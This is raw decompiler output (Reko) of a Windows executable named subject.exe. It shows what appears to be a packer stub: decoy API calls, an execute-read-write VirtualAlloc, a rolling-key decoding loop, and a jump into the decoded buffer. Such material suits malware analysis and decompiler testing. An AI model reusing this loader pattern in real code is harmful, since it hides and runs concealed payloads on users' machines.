// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040EC5D: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_2 eax_12 = IsWindow(dwArg04);
	if ((eax_12 | 0x01) == 0x01)
		eax_12 = fn0040EC97((byte) GetPrivateProfileIntA(fp - 0x04, fp - 0x04, 252, fp - 0x04), mm4, 252);
	return eax_12;
}

// 0040EC97: Register word32 fn0040EC97(Register byte bl, Register word64 mm4, Stack word32 dwArg00)
word32 fn0040EC97(byte bl, word64 mm4, word32 dwArg00)
{
	Eq_36 eax_10 = VirtualAlloc(0x00, 85811, 0x3000, 0x40);
	word32 ecx_19 = 0x01F6;
	union Eq_50 * esi_24 = dwArg00 + 166;
	Eq_36 edi_25 = eax_10;
	uint32 edx_30 = DPB(937090055, bl + 0x07, 0);
	word32 ebp_122 = 0x00;
	do
	{
		*edi_25 = (word32) *edi_25 + (byte) ((char *) (*esi_24) + edx_30);
		word32 ebp_67 = ebp_122 - 460344;
		uint32 edx_119 = edx_30 >> 0x08;
		esi_24 = (union Eq_50 *) ((char *) esi_24 + 0x01);
		edi_25 = edi_25 + 0x01;
		ebp_122 = ebp_67 + 0x00070639;
		byte dl_120 = (byte) edx_119;
		if (0x04 == ebp_67 + 0x00070639)
		{
			edx_119 = 937090055;
			dl_120 = 0x07;
			ebp_122 = 0x00;
		}
		byte dl_78 = dl_120 + bl;
		edx_30 = DPB(edx_119, dl_78, 0);
		ecx_19 = ecx_125 - 0x01;
		word32 ecx_125 = ecx_19;
	} while (ecx_125 != 0x01);
	word32 esp_88;
	word32 eax_89;
	byte * edi_90;
	byte SCZO_91;
	word32 esi_92;
	word32 ecx_93;
	word32 edx_94;
	byte dl_95;
	byte bl_96;
	word32 ebp_97;
	byte cl_98;
	byte SZO_99;
	bool Z_100;
	bool C_101;
	byte al_102;
	struct Eq_116 * es_103;
	word64 mm4_104;
	eax_10();
	if (ecx_93 == eax_89)
		return eax_89;
	*edi_90 = al_102;
	(word32 *) 687722014 = (word32) mm4_104;
}

